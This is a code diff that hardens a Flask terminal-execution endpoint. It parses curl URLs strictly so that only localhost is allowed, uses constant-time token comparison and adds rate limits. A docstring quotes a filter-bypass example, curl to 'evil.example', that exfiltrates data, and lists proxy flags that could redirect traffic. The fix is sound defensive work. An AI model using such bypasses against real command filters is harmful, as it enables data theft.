@@ -4,6 +4,7 @@ Requires Tier 1 auth for all exec/stream endpoints.
 """
 import os
 import re as _re
+import hmac as _hmac
 import json
 import shlex
 import subprocess
@@ -57,9 +58,35 @@ def _terminal_access_check(req):
 _TERMINAL_ALLOWED = frozenset([
     'ps', 'free', 'df', 'uptime', 'cat', 'journalctl',
 ])
+def _curl_is_localhost_only(args):
+    """Only allow the exact documented pattern: `curl [-s] <localhost-url>`.
+
+    A prior version only checked whether the substring 'localhost' or
+    '127.0.0.1' appeared ANYWHERE in the args — `curl http://evil.example/localhost`
+    passed that check while actually exfiltrating to evil.example. This version
+    parses the real URL and rejects everything else, including flags like
+    --resolve/--connect-to/-x/--proxy that could redirect an apparently-local
+    URL to a remote host at the TCP level regardless of what the URL says.
+    """
+    import urllib.parse as _urlparse
+    positional = [a for a in args if not a.startswith('-')]
+    flags      = [a for a in args if a.startswith('-')]
+    if flags not in ([], ['-s']):
+        return False
+    if len(positional) != 1:
+        return False
+    try:
+        parsed = _urlparse.urlparse(positional[0])
+    except ValueError:
+        return False
+    return (
+        parsed.scheme in ('http', 'https')
+        and parsed.hostname in ('localhost', '127.0.0.1', '::1')
+    )
+
 _TERMINAL_RESTRICTED = {
     # curl: only to localhost/127.0.0.1 — blocks outbound data exfiltration
-    'curl':      lambda args: any('localhost' in a or '127.0.0.1' in a for a in args),
+    'curl':      _curl_is_localhost_only,
     # systemctl: only status queries, not start/stop/enable/disable
     'systemctl': lambda args: bool(args) and args[0] == 'status',
     # python3: only as a json formatter, never arbitrary -c execution
@@ -528,6 +555,7 @@ def pi_status():
 
 
 @bp.route('/terminal/pi_register', methods=['POST'])
+@_limiter.limit('10 per minute; 50 per hour')
 @csrf_required
 def pi_register():
     """Pi calls this on connect to register its tunnel URL.
@@ -537,7 +565,7 @@ def pi_register():
     """
     data  = request.get_json() or {}
     token = data.get('token', '')
-    if not _ARCHER_PI_TOKEN or token != _ARCHER_PI_TOKEN:
+    if not _ARCHER_PI_TOKEN or not _hmac.compare_digest(token, _ARCHER_PI_TOKEN):
         return jsonify({'error': 'Invalid token'}), 403
     pi_tunnel_url['url']       = data.get('url')
     pi_tunnel_url['online']    = True
@@ -547,11 +575,12 @@ def pi_register():
 
 
 @bp.route('/terminal/pi_disconnect', methods=['POST'])
+@_limiter.limit('10 per minute; 50 per hour')
 @csrf_required
 def pi_disconnect():
     data  = request.get_json() or {}
     token = data.get('token', '')
-    if not _ARCHER_PI_TOKEN or token != _ARCHER_PI_TOKEN:
+    if not _ARCHER_PI_TOKEN or not _hmac.compare_digest(token, _ARCHER_PI_TOKEN):
         return jsonify({'error': 'Invalid token'}), 403
     pi_tunnel_url['online'] = False
     pi_tunnel_url['url']    = None
